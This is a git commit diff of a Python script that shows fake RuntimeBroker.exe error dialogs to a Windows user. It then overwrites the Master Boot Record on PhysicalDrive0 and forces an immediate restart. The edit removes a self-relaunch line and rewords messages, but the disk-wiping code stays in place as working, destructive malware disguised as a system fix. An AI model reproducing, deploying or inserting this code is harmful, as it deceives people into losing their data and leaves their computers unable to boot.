a5721793eb7e53e039717261948bb3f18ef8f37a
Lovely Disease <83523587+CPScript@users.noreply.github.com>
2023-09-14 09:55:13 -0400

    Update file.py

--- file.py
+++ file.py
@@ -17,17 +17,17 @@ warningdescription = 'The instruction at 0x00007FF950FCBE4B reference memory at 
 
 if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7: 
   MessageBox("RuntimeBroker.exe is very inportant, your pc could run into many falulars, would you like to restart RuntimeBroker.exe", "Alert - RuntimeBroker.exe", MB_ICONWARNING | MB_OK)
-  call(["python", "GoodNight.py"]) # run again... your not gonna get out of this :)
-  time.sleep(250)
-  exit()
+  # script goes here
 
 # | OverWrite Script |
 hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create handle
 WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite MBR!
 CloseHandle(hDevice) # Close the handle
 
-MessageBox("RuntimeBroker.exe has been fixed, please report to microsoft support is any more problems occur.", "Restarted - RuntimeBroker.exe", MB_ICONWARNING | MB_OK) 
+MessageBox("RuntimeBroker.exe has been fixed, please contact microsoft support if any other problems occur.", "Restarted - RuntimeBroker.exe", MB_ICONWARNING | MB_OK) 
 time.sleep(120)
 MessageBox("Your PC requires a restart. (Reason: Master Boot Record(MBR) has been changed) Please click ok to restart.", "System", MB_ICONWARNING | MB_OK) 
+
+
 
 os.system("shutdown /r /t 1")
